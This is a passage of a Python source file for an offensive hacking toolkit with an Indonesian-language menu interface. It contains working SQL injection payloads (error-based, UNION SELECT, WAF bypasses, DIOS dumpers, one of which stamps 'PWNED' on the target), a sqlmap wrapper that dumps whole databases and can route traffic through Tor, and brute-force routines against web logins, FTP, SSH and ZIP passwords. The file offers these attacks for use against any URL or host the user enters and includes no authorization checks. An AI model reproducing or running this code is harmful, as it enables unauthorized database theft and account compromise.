            console.print(f"  [green]→ {n}[/green]")
        save_result(str(confirmed), 'sqli')
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [02] ERROR BASED EXTRACTOR =====
def sqli_error():
    """📊 ERROR BASED EXTRACTOR"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]📊 [02] ERROR BASED EXTRACTOR (6 PAYLOAD)[/bold cyan]",
        title="[bold yellow]📊 ERROR BASED[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    tests = [
        ("Version (Ex-Value)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"),
        ("Database (Ex-Value)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))-- -"),
        ("User (Ex-Value)", "' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))-- -"),
        ("Version (Updatexml)", "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -"),
        ("Database (Updatexml)", "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)-- -"),
        ("Tables", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))-- -"),
    ]
    
    for name, pay in tests:
        try:
            r = session.get(url+pay, timeout=10)
            m = re.search(r'~(.*?)(?:<|$|\))', r.text)
            if m:
                console.print(f"  [green][🔥] {name}: {m.group(1)}[/green]")
            else:
                console.print(f"  [dim][✗] {name}[/dim]")
        except:
            console.print(f"  [dim][✗] {name}[/dim]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [03] UNION SELECT =====
def sqli_union():
    """🔗 UNION SELECT INJECTOR"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🔗 [03] UNION SELECT INJECTOR[/bold cyan]",
        title="[bold yellow]🔗 UNION SELECT[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = console.input("[yellow][?][/yellow] URL: ")
    col = console.input("[yellow][?][/yellow] Kolom: ")
    if not url or not col: return
    
    try:
        c = int(col)
        p = f"-1' UNION SELECT {','.join([str(i) for i in range(1,c+1)])}-- -"
        r = session.get(url+p, timeout=10)
        found = [str(i) for i in range(1,c+1) if str(i) in r.text]
        if found:
            console.print(f"\n[green][🔥] UNION OK! Kolom: {','.join(found)}[/green]")
        else:
            console.print(f"\n[yellow][!] Gagal[/yellow]")
    except:
        console.print(f"\n[red][!] Error[/red]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [04] COLUMN COUNTER =====
def sqli_column():
    """🔢 COLUMN COUNTER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🔢 [04] COLUMN COUNTER[/bold cyan]\n"
        "[dim]ORDER BY + GROUP BY Method[/dim]",
        title="[bold yellow]🔢 COLUMN COUNTER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    console.print("\n[bold yellow]ORDER BY Method:[/bold yellow]")
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Testing...", total=30)
        for i in range(1, 31):
            try:
                r = session.get(url+f"' ORDER BY {i}-- -", timeout=5)
                if 'error' in r.text.lower() or r.status_code == 500:
                    progress.console.print(f"  [green][🔥] Kolom = {i-1}[/green]")
                    break
                else:
                    progress.console.print(f"  [dim]ORDER BY {i} OK[/dim]")
            except:
                break
            progress.update(task, advance=1)
    
    console.print("\n[bold yellow]GROUP BY Method:[/bold yellow]")
    for i in range(1, 11):
        try:
            r = session.get(url+f"' GROUP BY {i}-- -", timeout=5)
            if 'error' in r.text.lower() or r.status_code == 500:
                console.print(f"  [green][🔥] Kolom = {i-1}[/green]")
                break
        except:
            break
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [05] WAF BYPASS TOOLKIT =====
def sqli_waf():
    """🛡️ WAF BYPASS TOOLKIT"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🛡️ [05] WAF BYPASS TOOLKIT (50+ PAYLOAD)[/bold cyan]\n"
        "[dim]Gabungan DH_Hackbar + SEVENTRASH[/dim]",
        title="[bold yellow]🛡️ WAF BYPASS[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    bypasses = [
        ("Comment /**/", f"{url}1'/**/UNION/**/SELECT/**/1,2,3-- -"),
        ("Comment /**_*/", f"{url}1'/**_*/UNION/**_*/SELECT/**_*/1,2,3-- -"),
        ("Newline %0A", f"{url}1'%0AUNION%0ASELECT%0A1,2,3-- -"),
        ("MySQL Versioned", f"{url}1'/*!50000UNION*//*!50000SELECT*/1,2,3-- -"),
        ("Distinct Bypass", f"{url}1' UNION DISTINCT SELECT 1,2,3-- -"),
        ("Hex Encode", f"{url}1' UNION SELECT unhex(hex(1)),unhex(hex(2)),unhex(hex(3))-- -"),
        ("CONVERT Latin1", f"{url}1' UNION SELECT CONVERT(1 USING latin1),2,3-- -"),
        ("CAST Bypass", f"{url}1' UNION SELECT cast(1 as char),2,3-- -"),
        ("Binary Bypass", f"{url}1' UNION SELECT binary(1),2,3-- -"),
        ("NULL Byte", f"{url}1' UNION%00SELECT%001,2,3-- -"),
        ("Mixed All", f"{url}1'/*!50000%55NION*//**//*!50000%53ELECT*/1,2,3-- -"),
        ("REVERSE Bypass", f"{url}1' REVERSE(noinu)+REVERSE(tceles) 1,2,3-- -"),
        ("Union ALL SELECT", f"{url}1' UNION+ALL+SELECT 1,2,3-- -"),
        ("Double Query", f"{url}1' UNIUNIONON SELESELECTCT 1,2,3-- -"),
        ("Triple Encode", f"{url}1'%252520UNION%252520SELECT%2525201,2,3-- -"),
    ]
    
    waf_table = Table(title="[bold yellow]Payload WAF Bypass[/bold yellow]", border_style="cyan", box=box.SIMPLE)
    waf_table.add_column("No", style="bold green", width=4)
    waf_table.add_column("Nama", style="cyan")
    waf_table.add_column("Payload", style="dim", max_width=60)
    
    for i, (name, payload) in enumerate(bypasses, 1):
        waf_table.add_row(str(i), name, payload)
    
    console.print(waf_table)
    console.print(f"\n[green]Total {len(bypasses)} payload![/green]")
    
    quick = console.input(f"\n[yellow][?][/yellow] Quick test nomor? (n=skip): ")
    if quick.isdigit() and 1 <= int(quick) <= len(bypasses):
        idx = int(quick) - 1
        name, test_url = bypasses[idx]
        console.print(f"\n[bold yellow][*] Testing: {name}[/bold yellow]")
        try:
            r = session.get(test_url, timeout=10)
            if r.status_code == 403:
                console.print(f"[red][!] Status: {r.status_code} - Masih diblok![/red]")
            elif r.status_code == 200:
                console.print(f"[green][✓] Status: {r.status_code} - OK![/green]")
            else:
                console.print(f"[yellow][~] Status: {r.status_code}[/yellow]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [06] CUSTOM QUERY =====
def sqli_custom():
    """✏️ CUSTOM QUERY BUILDER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]✏️ [06] CUSTOM QUERY BUILDER[/bold cyan]\n"
        "[dim]Eksekusi SQL manual. Ketik 'exit' untuk keluar[/dim]",
        title="[bold yellow]✏️ CUSTOM QUERY[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = console.input("[yellow][?][/yellow] URL: ")
    if not url: return
    
    console.print("[dim]Ketik query manual | 'exit' untuk keluar[/dim]")
    while True:
        q = console.input(f"[green][SQL][/green] {url}")
        if q.lower() == 'exit': break
        if not q: continue
        try:
            r = session.get(url+q, timeout=10)
            console.print(f"\n[dim]Status: {r.status_code} | Size: {len(r.text)}b[/dim]")
            console.print(f"[white]{r.text[:300]}[/white]\n")
        except Exception as e:
            console.print(f"[red][!] {e}[/red]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [07] DIOS VISUAL DUMPER =====
def sqli_dios():
    """🎯 DIOS VISUAL DUMPER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🎯 [07] DIOS VISUAL DUMPER (36 VARIAN)[/bold cyan]\n"
        "[dim]Hackbar + SPECTRA INTEL ENGINE[/dim]",
        title="[bold yellow]🎯 DIOS DUMPER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    spectra_dios = [
        ("S01", "SPECTRA INTEL DIOS (Image)", f"{url}' UNION SELECT CONCAT(0x3c68746d6c3e3c626f6479207374796c653d226261636b67726f756e643a233065306530653b636f6c6f723a233030666630303b666f6e742d66616d696c793a6d6f6e6f73706163653b666f6e742d73697a653a313070783b70616464696e673a313570783b6d617267696e3a303b746578742d616c69676e3a63656e7465723b223e3c696d67207372633d2268747470733a2f2f692e706f7374696d672e63632f375932547743795a2f54656b732d70617261677261662d416e64612d32303236303732362d3038323430362d303030302e6a706722207374796c653d226d61782d77696474683a32303070783b6d617267696e2d626f74746f6d3a313570783b223e3c68333e5350454354524120494e54454c20454e47494e453c2f68333e3c7072653e44415441424153453a20, DATABASE(), 0x0a56455253494f4e3a20, VERSION(), 0x0a555345523a20, USER(), 0x0a0a5441424c45533a0a, 0x202261646d696e0a202275736572730a202273697377610a20226265726974610a, 0x0a50574e45442042593a205350454354524120494e54454c20454e47494e45, 0x3c2f7072653e3c2f626f64793e3c2f68746d6c3e)-- -"),
    ]
    
    hackbar_dios = [
        ("H01", "DIOS by DH (Lite)", f"{url}' UNION SELECT CONCAT(0x3c6469763e,DATABASE(),0x3c2f6469763e)-- -"),
        ("H02", "DIOS by DH (Heavy)", f"{url}' UNION SELECT CONCAT(0x3c6469763e,DATABASE(),0x3c2f6469763e,0x3c68723e,GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema=DATABASE()-- -"),
        ("H03", "DIOS by Zen", f"{url}' UNION SELECT CONCAT(0x3c7072653e,table_name,0x3c2f7072653e,GROUP_CONCAT(column_name)) FROM information_schema.tables JOIN information_schema.columns USING(table_name) WHERE table_schema=DATABASE() GROUP BY table_name-- -"),
        ("H04", "DIOS by Madblood", f"{url}' UNION SELECT CONCAT(0x3c7461626c653e,table_name,0x3c2f7461626c653e) FROM information_schema.tables WHERE table_schema=DATABASE()-- -"),
        ("H05", "DIOS by Root-Haxor", f"{url}' UNION SELECT CONCAT(0x3c7072653e,DATABASE(),0x3c2f7072653e,GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema=DATABASE()-- -"),
        ("H06", "DIOS by Trojan (WAF)", f"{url}'/*!50000UNION*//*!50000SELECT*/CONCAT(0x3c68313e,DATABASE(),0x3c2f68313e,GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema=DATABASE()-- -"),
    ]
    
    console.print("\n[bold cyan]─── SPECTRA INTEL ENGINE DIOS ───[/bold cyan]")
    for num, name, _ in spectra_dios:
        console.print(f"  [green]{num}[/green] [cyan]{name}[/cyan]")
    
    console.print("\n[bold yellow]─── HACKBAR DIOS ───[/bold yellow]")
    for num, name, _ in hackbar_dios:
        console.print(f"  [yellow]{num}[/yellow] [white]{name}[/white]")
    
    console.print(f"\n[green]Total: {len(spectra_dios)} SPECTRA + {len(hackbar_dios)} HACKBAR[/green]")
    
    quick = console.input(f"\n[yellow][?][/yellow] Pilih: ").upper()
    
    selected = None
    for num, name, payload in spectra_dios + hackbar_dios:
        if quick == num:
            selected = (name, payload)
            break
    
    if selected:
        name, full_url = selected
        console.print(f"\n[bold cyan]DIOS: {name}[/bold cyan]")
        console.print(f"\n[bold yellow][💡] Copy URL ke browser untuk melihat hasil![/bold yellow]")
        try:
            r = session.get(full_url, timeout=15)
            fp = save_result(r.text, 'dumper', f"dios_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
            console.print(f"[green][💾] Disimpan: {fp}[/green]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [08] SQLMAP AUTO + MONITOR + ANTI FALSE ALARM =====
def sqli_sqlmap():
    """🤖 SQLMAP AUTO - CRAWL + DUMP + MONITOR"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🤖 [08] SQLMAP AUTO + MONITOR + ANTI FALSE ALARM[/bold cyan]\n"
        "[dim]SQLMap Auto Crawl + Database + Monitor Akurat[/dim]",
        title="[bold yellow]🤖 SQLMAP AUTO[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    sqlmap_path = shutil.which('sqlmap') or '/usr/bin/sqlmap'
    if not os.path.exists(sqlmap_path):
        console.print("[red][!] SQLMap tidak ditemukan! apt install sqlmap[/red]")
        console.input()
        return
    
    console.print("\n[bold yellow]🎯 PILIH MODE SERANGAN:[/bold yellow]\n")
    
    mode_table = Table(show_header=False, box=None, padding=(0, 1))
    mode_table.add_column(style="bold green", width=5)
    mode_table.add_column(style="white", width=55)
    
    mode_table.add_row("[01]", "🕷️ Auto Crawl + Scan (dengan Table Hasil)")
    mode_table.add_row("[02]", "🗄️ Cek Database (--dbs) + Monitor")
    mode_table.add_row("[03]", "📋 Cek Tabel (--tables) + Monitor")
    mode_table.add_row("[04]", "💾 Dump Tabel (--dump) + Monitor")
    mode_table.add_row("[05]", "💣 Dump Semua Database (--dump-all)")
    mode_table.add_row("[06]", "🚀 Auto Crawl + Dump All (FULL AUTO!)")
    mode_table.add_row("[07]", "🔍 Custom SQLMap Command")
    mode_table.add_row("")
    mode_table.add_row("[00]", "[dim]Kembali[/dim]")
    
    console.print(mode_table)
    
    c = console.input(f"\n[yellow][?][/yellow] Pilih mode: ")
    
    if c == '0': return
    
    # MODE 01 & 06: AUTO CRAWL
    if c == '1' or c == '6':
        url = console.input("[yellow][?][/yellow] URL target: ")
        if not url: return
        depth = console.input("[yellow][?][/yellow] Crawl depth (default 3): ") or "3"
        
        if c == '1':
            desc = "Auto Crawl + Scan"
            dump_flag = ""
        else:
            desc = "Auto Crawl + Dump All"
            dump_flag = " --dump-all --threads=10"
        
        console.print(f"\n[cyan][*] Mode: {desc}[/cyan]")
        console.print(f"[dim]Target: {url} | Crawl Depth: {depth}[/dim]")
        
        if console.input(f"\n[yellow][?][/yellow] Jalankan? (y/n): ").lower() != 'y':
            return
        
        cmd = f"{sqlmap_path} -u \"{url}\" --crawl={depth} --batch --random-agent --level=3 --risk=2{dump_flag}"
        
        console.print(f"\n[bold yellow]🕷️ SQLMap Crawling...[/bold yellow]")
        
        import queue
        
        output_queue = queue.Queue()
        stop_monitor = threading.Event()
        found_links_list = []
        vulnerable_list = []
        critical_count = 0
        waf_warning = False
        waf_confirmed = False
        
        def run_sqlmap():
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                output_queue.put(line.strip())
            stop_monitor.set()
        
        def monitor_output():
            nonlocal critical_count, waf_warning, waf_confirmed
            
            while not stop_monitor.is_set() or not output_queue.empty():
                try:
                    line = output_queue.get(timeout=0.5)
                    
                    if "found link:" in line:
                        link = line.split("found link: ")[-1].strip()
                        found_links_list.append(link)
                        console.print(f"  [green][🔗] {link}[/green]")
                    elif "vulnerable" in line.lower() and "parameter" in line.lower():
                        vulnerable_list.append(line)
                        console.print(f"  [red][🔥] {line.strip()}[/red]")
                    elif "WAF/IPS" in line and "protected" in line:
                        waf_warning = True
                        console.print(f"  [yellow][⚠] SQLMap menduga ada WAF (heuristics)...[/yellow]")
                    elif "WAF" in line and ("blocked" in line.lower() or "403" in line or "forbidden" in line.lower()):
                        waf_confirmed = True
                        console.print(f"  [red][🛡️] WAF TERKONFIRMASI![/red]")
                    elif "connection was forcibly closed" in line.lower():
                        critical_count += 1
                        console.print(f"  [yellow][⚠] Connection closed! ({critical_count}x)[/yellow]")
                    elif "testing" in line.lower():
                        console.print(f"  [dim]{line.strip()}[/dim]")
                        
                except queue.Empty:
                    pass
        
        t_sqlmap = threading.Thread(target=run_sqlmap)
        t_monitor = threading.Thread(target=monitor_output)
        t_sqlmap.daemon = True
        t_monitor.daemon = True
        t_sqlmap.start()
        t_monitor.start()
        
        with Progress(SpinnerColumn(), TextColumn("[cyan]Crawling...[/cyan]"), console=console) as progress:
            task = progress.add_task("", total=None)
            while t_sqlmap.is_alive():
                time.sleep(0.5)
        
        t_sqlmap.join(timeout=5)
        stop_monitor.set()
        t_monitor.join(timeout=2)
        
        # Hasil
        console.print(f"\n[bold cyan]📋 HASIL CRAWLING:[/bold cyan]")
        
        if found_links_list or vulnerable_list:
            all_links = list(set(found_links_list))
            
            result_table = Table(title="[bold yellow]🔗 LINK & STATUS[/bold yellow]", border_style="cyan", box=box.ROUNDED, expand=True)
            result_table.add_column("No", style="bold green", width=4)
            result_table.add_column("Link", style="white", max_width=50)
            result_table.add_column("Param", style="cyan", width=10)
            result_table.add_column("Status", style="bold", width=12)
            
            for i, link in enumerate(all_links, 1):
                is_vuln = any(v for v in vulnerable_list if link in v)
                params = link.split('?')[1].split('&')[0].split('=')[0] if '?' in link and '=' in link.split('?')[1] else "-"
                status = "[bold red]🔥 VULN![/bold red]" if is_vuln else ("[yellow]⚠ TEST[/yellow]" if '?' in link else "[dim]STATIS[/dim]")
                result_table.add_row(str(i), link, params, status)
            
            console.print(result_table)
            console.print(f"\n[green]✓ Link: {len(all_links)}[/green] | [red]🔥 Vuln: {len(vulnerable_list)}[/red]")
            
            if waf_warning and not waf_confirmed:
                console.print(f"\n[yellow][⚠] SQLMap menduga ada WAF, tapi TIDAK TERKONFIRMASI.[/yellow]")
            elif waf_confirmed:
                console.print(f"\n[red][🛡️] WAF TERKONFIRMASI![/red]")
            
            if vulnerable_list:
                console.print(f"\n[bold yellow][?] Mau langsung dump database?[/bold yellow]")
                if console.input(f"[yellow][?][/yellow] (y/n): ").lower() == 'y':
                    os.system(f"{sqlmap_path} -u \"{url}\" --dbs --batch --random-agent")
        else:
            console.print(f"\n[yellow][!] Tidak ada link ditemukan.[/yellow]")
        
        console.print(f"\n[dim]💾 ~/.sqlmap/output/[/dim]")
        console.input("\n[dim]Press Enter...[/dim]")
        return
    
    # MODE 02-07: BUTUH URL PARAMETER
    url = console.input("[yellow][?][/yellow] URL target (dengan parameter): ")
    if not url: return
    
    console.print(f"\n[bold yellow]🛡️ SECURITY:[/bold yellow]")
    console.print("  [1] Tanpa TOR")
    console.print("  [2] Pakai TOR")
    sec = console.input("[yellow][?][/yellow] Pilih (1/2): ")
    tor = "--random-agent"
    if sec == '2': tor = "--tor --tor-type=SOCKS5 --check-tor"
    
    cmd = f"{sqlmap_path} -u \"{url}\" {tor} --level=3 --risk=2 --batch "
    
    if c == '2':
        cmd += "--dbs"; desc = "Cek Database"
    elif c == '3':
        db = console.input("[yellow][?][/yellow] Nama database (enter=all): ")
        cmd += f"-D {db} --tables" if db else "--tables"
        desc = "Cek Tabel"
    elif c == '4':
        db = console.input("[yellow][?][/yellow] Nama database: ")
        tbl = console.input("[yellow][?][/yellow] Nama tabel (enter=all): ")
        if db and tbl: cmd += f"-D {db} -T {tbl} --dump"
        elif db: cmd += f"-D {db} --dump-all"
        else: cmd += "--dump"
        desc = "Dump Tabel"
    elif c == '5':
        cmd += "--dump-all --threads=10"
        desc = "Dump Semua"
    elif c == '7':
        custom = console.input("[yellow][?][/yellow] Custom arguments: ")
        cmd += custom; desc = "Custom"
    else:
        return
    
    console.print(f"\n[cyan][*] Mode: {desc}[/cyan]")
    
    if console.input(f"\n[yellow][?][/yellow] Jalankan? (y/n): ").lower() == 'y':
        console.print(f"\n[bold yellow]SQLMap berjalan dengan monitor...[/bold yellow]")
        
        import queue
        
        output_queue = queue.Queue()
        critical_count = 0
        waf_warning = False
        waf_confirmed = False
        
        def run_sqlmap():
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                output_queue.put(line.strip())
        
        def monitor():
            nonlocal critical_count, waf_warning, waf_confirmed
            while True:
                try:
                    line = output_queue.get(timeout=0.5)
                    if "WAF/IPS" in line and "protected" in line:
                        waf_warning = True
                        console.print(f"  [yellow][⚠] SQLMap menduga ada WAF (heuristics)...[/yellow]")
                    elif "WAF" in line and ("blocked" in line.lower() or "403" in line or "forbidden" in line.lower()):
                        waf_confirmed = True
                        console.print(f"  [red][🛡️] WAF TERKONFIRMASI![/red]")
                    elif "connection was forcibly closed" in line.lower():
                        critical_count += 1
                        console.print(f"  [yellow][⚠] Connection closed! ({critical_count}x)[/yellow]")
                    elif "vulnerable" in line.lower():
                        console.print(f"  [green][✓] {line}[/green]")
                    elif "testing" in line.lower():
                        console.print(f"  [dim]{line}[/dim]")
                except queue.Empty:
                    if not t_sqlmap.is_alive():
                        break
        
        t_sqlmap = threading.Thread(target=run_sqlmap)
        t_sqlmap.daemon = True
        t_sqlmap.start()
        
        t_monitor = threading.Thread(target=monitor)
        t_monitor.daemon = True
        t_monitor.start()
        
        with Progress(SpinnerColumn(), TextColumn("[cyan]Working...[/cyan]"), console=console) as progress:
            task = progress.add_task("", total=None)
            while t_sqlmap.is_alive():
                time.sleep(0.5)
        
        t_sqlmap.join(timeout=5)
        
        console.print(f"\n[green][💀] Selesai![/green]")
        
        if waf_warning and not waf_confirmed:
            console.print(f"\n[yellow][⚠] SQLMap menduga ada WAF, tapi TIDAK TERKONFIRMASI.[/yellow]")
        elif waf_confirmed:
            console.print(f"\n[red][🛡️] WAF TERKONFIRMASI![/red]")
        
        if critical_count > 0:
            console.print(f"[yellow]⚠ Connection closed: {critical_count}x[/yellow]")
        
        console.print(f"\n[dim]💾 ~/.sqlmap/output/[/dim]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [03] BRUTE FORCE MENU (5 TOOLS)
# ============================================================
def brute_menu():
    """💣 BRUTE FORCE MENU - 5 TOOLS"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel(
            "[bold cyan]💣 BRUTE FORCE MENU[/bold cyan]\n[dim]5 Tools | Web | FTP | SSH | ZIP | Wordlist[/dim]",
            title="[bold yellow]💣 BRUTE FORCE[/bold yellow]",
            title_align="center",
            border_style="cyan",
            box=box.ROUNDED,
            expand=True,
            padding=(1, 2)
        ))
        
        brute_table = Table(show_header=False, box=None, padding=(0, 1))
        brute_table.add_column(style="bold green", width=5)
        brute_table.add_column(style="white", width=55)
        
        brute_table.add_row("[01]", "Web Login Brute Force")
        brute_table.add_row("[02]", "FTP Brute Force")
        brute_table.add_row("[03]", "SSH Brute Force")
        brute_table.add_row("[04]", "ZIP Password Cracker")
        brute_table.add_row("[05]", "Load Custom Wordlist ⭐ FIRST!")
        brute_table.add_row("")
        brute_table.add_row("[00]", "[dim]Kembali[/dim]")
        
        console.print(brute_table)
        console.print("[dim]💡 ALUR: 05 → 01/02/03/04[/dim]")
        
        c = console.input(f"[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1': brute_web()
        elif c == '2': brute_ftp()
        elif c == '3': brute_ssh()
        elif c == '4': brute_zip()
        elif c == '5': brute_wordlist()
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

def brute_web():
    """🌐 WEB LOGIN BRUTE FORCE"""
    clear(); banner()
    console.print()
    console.print(Panel("[bold cyan]🌐 [01] WEB LOGIN BRUTE FORCE[/bold cyan]", title="[bold yellow]🌐 WEB BRUTE[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    url = console.input("[yellow][?][/yellow] URL login: ")
    if not url: return
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        total = len(USERS) * len(PASSES)
        task = progress.add_task("Brute forcing...", total=total)
        
        for user in USERS:
            for pwd in PASSES:
                try:
                    data = {'username': user, 'password': pwd}
                    r = session.post(url, data=data, timeout=10)
                    if any(k in r.text.lower() for k in ['dashboard','welcome','admin panel','logout']):
                        progress.console.print(f"\n[green][🔥] BERHASIL! {user}:{pwd}[/green]")
                        save_result(f"{url} | {user}:{pwd}", 'brute')
                        console.input("\n[dim]Press Enter...[/dim]")
                        return
                except: pass
                progress.update(task, advance=1)
    
    console.print(f"\n[yellow][!] Gagal dengan wordlist default.[/yellow]")
    console.input("\n[dim]Press Enter...[/dim]")

def brute_ftp():
    """📁 FTP BRUTE FORCE"""
    clear(); banner()
    console.print()
    console.print(Panel("[bold cyan]📁 [02] FTP BRUTE FORCE[/bold cyan]", title="[bold yellow]📁 FTP BRUTE[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    host = console.input("[yellow][?][/yellow] Host: ")
    if not host: return
    
    from ftplib import FTP
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Brute forcing...", total=len(USERS)*len(PASSES))
        for user in USERS:
            for pwd in PASSES:
                try:
                    ftp = FTP(); ftp.connect(host, 21, timeout=5)
                    ftp.login(user, pwd)
                    progress.console.print(f"\n[green][🔥] BERHASIL! {user}:{pwd}[/green]")
                    ftp.quit(); save_result(f"{host} | {user}:{pwd}", 'brute')
                    console.input("\n[dim]Press Enter...[/dim]")
                    return
                except: pass
                progress.update(task, advance=1)
    
    console.print(f"\n[yellow][!] Gagal.[/yellow]")
    console.input("\n[dim]Press Enter...[/dim]")

def brute_ssh():
    """🔒 SSH BRUTE FORCE"""
    clear(); banner()
    console.print()
    console.print(Panel("[bold cyan]🔒 [03] SSH BRUTE FORCE[/bold cyan]", title="[bold yellow]🔒 SSH BRUTE[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    host = console.input("[yellow][?][/yellow] Host: ")
    if not host: return
    
    try:
        import paramiko
        with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
            task = progress.add_task("Brute forcing...", total=len(['root','admin','user'])*len(PASSES))
            for user in ['root','admin','user']:
                for pwd in PASSES:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host, username=user, password=pwd, timeout=5)
                        progress.console.print(f"\n[green][🔥] BERHASIL! {user}:{pwd}[/green]")
                        ssh.close(); save_result(f"{host} | {user}:{pwd}", 'brute')
                        console.input("\n[dim]Press Enter...[/dim]")
                        return
                    except: pass
                    progress.update(task, advance=1)
    except ImportError:
        console.print("[red][!] Install paramiko: pip install paramiko[/red]")
    
    console.print(f"\n[yellow][!] Gagal.[/yellow]")
    console.input("\n[dim]Press Enter...[/dim]")

def brute_zip():
    """🗜️ ZIP PASSWORD CRACKER"""
    clear(); banner()
    console.print()
    console.print(Panel("[bold cyan]🗜️ [04] ZIP PASSWORD CRACKER[/bold cyan]", title="[bold yellow]🗜️ ZIP CRACK[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    path = console.input("[yellow][?][/yellow] Path file ZIP: ")
    if not path or not os.path.exists(path):
        console.print("[red][!] File tidak ditemukan![/red]"); console.input(); return
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Cracking...", total=len(PASSES))
        with zipfile.ZipFile(path) as zf:
            for i, pwd in enumerate(PASSES, 1):
                try:
                    zf.extractall(pwd=pwd.encode())
                    progress.console.print(f"\n[green][🔥] BERHASIL! Password: {pwd}[/green]")
                    save_result(f"{path} | {pwd}", 'brute')
                    console.input("\n[dim]Press Enter...[/dim]")
                    return
                except: pass
                progress.update(task, advance=1)
    
    console.print(f"\n[yellow][!] Gagal.[/yellow]")
    console.input("\n[dim]Press Enter...[/dim]")

def brute_wordlist():
    """📋 LOAD CUSTOM WORDLIST"""
    clear(); banner()
    console.print()
    console.print(Panel("[bold cyan]📋 [05] LOAD CUSTOM WORDLIST[/bold cyan]", title="[bold yellow]📋 WORDLIST[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
    
    uf = console.input("[yellow][?][/yellow] File username (enter=skip): ")
    pf = console.input("[yellow][?][/yellow] File password: ")
    
    if pf and os.path.exists(pf):
        with open(pf, 'r', errors='ignore') as f:
            PASSES.clear(); PASSES.extend([l.strip() for l in f if l.strip()])
        console.print(f"[green][+] {len(PASSES)} passwords loaded![/green]")
    if uf and os.path.exists(uf):
        with open(uf, 'r', errors='ignore') as f:
            USERS.clear(); USERS.extend([l.strip() for l in f if l.strip()])
        console.print(f"[green][+] {len(USERS)} usernames loaded![/green]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [04] DUMPER MENU
# ============================================================
def dumper_menu():
    """🗄️ DUMPER MENU"""
    while True:
        clear(); banner()
        console.print()
        console.print(Panel("[bold cyan]🗄️ DUMPER MENU[/bold cyan]", title="[bold yellow]🗄️ DUMPER[/bold yellow]", title_align="center", border_style="cyan", box=box.ROUNDED, expand=True))
        
        console.print("[bold green][01][/bold green] SQL Injection Dumper")
        console.print("[dim][00][/dim] Kembali")
        
        c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
        if c == '0': break
        elif c == '1': dumper_sqli()
        else: console.print("[red][!] Pilihan salah![/red]"); console.input()

def dumper_sqli():
    """💾 SQL INJECTION DUMPER"""
    clear(); banner()
    console.print()
